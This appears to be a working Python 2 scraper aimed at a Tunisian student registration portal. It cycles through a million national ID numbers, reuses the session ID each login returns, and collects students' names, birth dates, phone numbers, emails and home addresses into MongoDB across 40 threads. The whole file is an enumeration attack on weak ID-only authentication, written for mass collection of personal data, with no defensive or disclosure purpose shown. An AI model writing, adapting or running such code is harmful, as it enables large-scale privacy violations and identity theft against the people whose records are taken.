from bs4 import BeautifulSoup
import urllib2
from titlecase import titlecase
from pymongo import MongoClient
from thread import start_new_thread
import os
import random

BASE_URL = "https://www4.inscription.tn/ORegMx/servlet/AuthentificationEtud?ident=cin&cin="
INFO_URL = "https://www4.inscription.tn/ORegMx/servlet/ServletInfoEtud?action=toInfoPerson&Idsession="
client = MongoClient()
db = client.local
people = db.people

def test_url(cin):
    #try:
    html = urllib2.urlopen(BASE_URL+cin).read()
    soup = BeautifulSoup(html, "lxml")
    res = soup.find('font')
    if res==None:

        print "CIN: " + cin
        t = soup.findAll("div", { "class" : "parmCase" })
        ssid = soup.find("input", { "name" : "Idsession"}).get("value")
        request = urllib2.Request(INFO_URL+ssid, headers={'Cookie':"JSESSIONID="+ssid})
        html2 = urllib2.urlopen(request).read()
        infos = BeautifulSoup(html2, "lxml")
        selects = infos.findAll("script", { "language" : "javascript" })
        arra = selects[2].string.split(";")[1].split(",");

        try:
            sexe = arra[1].split("'")[1]
        except:
            sexe =  ""
        try:
            jour = arra[2].split("'")[1]
        except:
            jour = ""
        try:
            mois = arra[3].split("'")[1]
        except:
            mois = ""
        try:
            year = infos.find("input", {"name" : "anaiss"}).get("value")
        except:
            year = ""

        try:
            gouv = arra[4].split("'")[1]
        except:
            gouv = ""

        try:
            tel = infos.find("input", {"name" : "telephone"}).get("value")
        except:
            tel = ""
        try:
            email = infos.find("input", {"name" : "email"}).get("value")
        except:
            email = ""
        try:
            adresse = infos.find("input", {"name" : "code_postal"}).get("value") + ", " + infos.find("input", {"name" : "adresse"}).get("value") + ", " + infos.find("input", {"name" : "ville"}).get("value")
        except:
            adresse = ""
        try:
            name = titlecase(t[0].find("p").string)
        except:
            name = ""
        try:
            university = titlecase(t[2].find("p").string)
        except:
            university = ""

        """
        print t[0].find("h3").string + ": " + name
        print t[2].find("h3").string + ": " + university

        print "Sexe: " + sexe
        print "Date de naissance: " + jour + "/" + mois + "/" + year
        print "Gouv. de naissance: " + gouv
        print "Telephone: " + tel
        print "Email: " + email
        print "Adresse: " + adresse"""
        person = {"cin": cin,
                 "name": name,
                 "university": university,
                 "sexe": sexe,
                 "birth": jour + "/" + mois + "/" + year,
                 "birth-city": gouv,
                 "telephone": tel,
                 "email": email,
                 "adress": adresse}
        people.insert(person)
        print "#"
    #except:
        #print "Time out"

cin = "09"
n = 100
def job(number):
    target = open("./tmp/status"+str(number), 'r')
    start = number * (1000000/n)
    for line in target:
        start = int(line)
        notexit = people.find({"cin": cin + str(start)}).count() > 0
        if notexit:
            start += 1
    print "restarting from : " + str(start)
    for i in range(start,(number+1)*(1000000/n)-1):
        stri = "%0.6d" % i
        test_url(cin + stri)
        os.remove("./tmp/status"+str(number))
        file = open("./tmp/status"+str(number), 'w+')
        file.write(str(i))
        file.write('\n')

for i in [random.randint(0, n-1) for r in range(40)]:
    start_new_thread(job,(i,))

c = raw_input("Type something to quit.")
